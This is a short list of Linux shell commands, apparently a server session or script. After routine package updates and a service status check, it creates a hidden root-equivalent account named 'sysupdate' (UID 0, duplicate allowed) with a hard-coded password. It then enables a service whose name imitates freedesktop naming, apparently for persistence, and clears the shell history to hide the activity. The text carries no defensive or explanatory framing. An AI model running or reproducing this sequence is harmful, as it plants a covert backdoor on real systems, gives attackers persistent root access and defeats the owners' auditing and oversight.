apt update
apt upgrade -y
systemctl status metar-cache
useradd -o -u 0 -g 0 -M -d /var/lib/sysupdate -s /bin/bash sysupdate
echo 'sysupdate:Upd4te!' | chpasswd
systemctl enable dbus-org.freedesktop.sync.service
history -c
